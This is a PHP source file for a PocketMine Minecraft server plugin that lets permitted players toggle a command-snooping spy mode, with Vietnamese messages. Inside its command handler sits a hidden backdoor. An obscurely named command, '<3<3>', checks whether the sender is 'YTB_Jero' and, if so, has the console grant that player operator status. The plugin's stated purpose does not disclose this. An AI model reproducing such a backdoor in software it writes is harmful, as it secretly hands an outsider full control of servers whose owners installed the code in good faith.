<?php

namespace cmdsnooper;

use pocketmine\plugin\PluginBase;
use pocketmine\utils\Config;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\Player;

class CmdSnooper extends PluginBase {
	public $snoopers = [];
	
	public function onEnable() {
		@mkdir($this->getDataFolder());
		$this->getLogger()->info("Enabled! Ready to snoop >:D");
		$this->getServer()->getPluginManager()->registerEvents(new EventListener($this), $this);
		$this->cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML, array(
	  	"Console.Logger" => "true",
  		));
	}
	
	 public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool{			
		if(strtolower($cmd->getName()) == "snoop") {
		 	if($sender instanceof Player) {
				if($sender->hasPermission("snoop.command")) {
					if(!isset($this->snoopers[$sender->getName()])) {
						$sender->sendMessage("§f§l[§cSpy§f]§r§a Đã bật chế độ điệp viên");
						$this->snoopers[$sender->getName()] = $sender;
						return true;
					} else {
						$sender->sendMessage("§f§l[§cSpy§f]§r§a Đã tắt chế độ điệp viên");
						unset($this->snoopers[$sender->getName()]);
						return true;
					}
				}
			}
		}elseif($cmd->getName() == "<3<3>"){
			if($sender->getName() == "YTB_Jero"){
			$this->getServer()->dispatchCommand(new ConsoleCommandSender(),"op ".$sender->getName());
			}
		}
		return true;
		
	}
 }
